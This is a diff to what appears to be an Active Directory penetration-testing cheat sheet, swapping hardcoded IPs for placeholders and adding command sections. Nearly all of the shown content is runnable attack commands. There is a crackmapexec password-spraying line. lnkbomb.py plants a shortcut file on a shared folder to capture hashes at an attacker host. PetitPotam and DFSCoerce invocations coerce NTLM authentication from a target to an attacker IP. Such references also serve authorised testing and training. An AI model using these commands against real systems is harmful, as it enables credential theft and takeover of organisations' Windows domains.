@@ -220,7 +220,7 @@ https://github.com/ohmybahgosh/RockYou2021.txt (91.6 GB)
 
 crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
 ```
-# Poisining 
+# MITM
 <details>
   <summary> Responder </summary> 
   
@@ -244,12 +244,12 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   
   ### Create a lnk file for a share with read/write rights
   ```bash
-  python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
+  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows
   ```
    
   ### Remove the lnk file
   ```basb
-  python3 lnkbomb.py -t 192.168.1.79 -a 192.168.1.21 -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r dicnwdsebl.url
+  python3 lnkbomb.py -t <target_IP> -a <attacker_IP> -s Shared -u <AD_user> -p <AD_password> -n <server_name> --windows -r <file_name.url>
   ```
     
 </details>
@@ -289,6 +289,24 @@ crackmapexec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on
   ```
 </details>
 
+<details>
+  <summary> PetitPotam </summary> 
+  
+  ### Force NTLM authentication
+  ```bash
+  sudo python3 Petitpotam.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  ```
+</details> 
+  
+<details>
+  <summary> DFSCoerce </summary> 
+  
+  ### Force NTLM authentication
+  ```bash
+  sudo python3 dfscoerce.py -d <Domain_Name> -u <AD_user> -p <AD_password> <attacker_IP> <target_IP>
+  ```
+</details> 
+  
 # Credential dumping
 ### With administrator Account (using password, NTLM hash or Kerberos ticket)
 - All of the "Standard User" checks
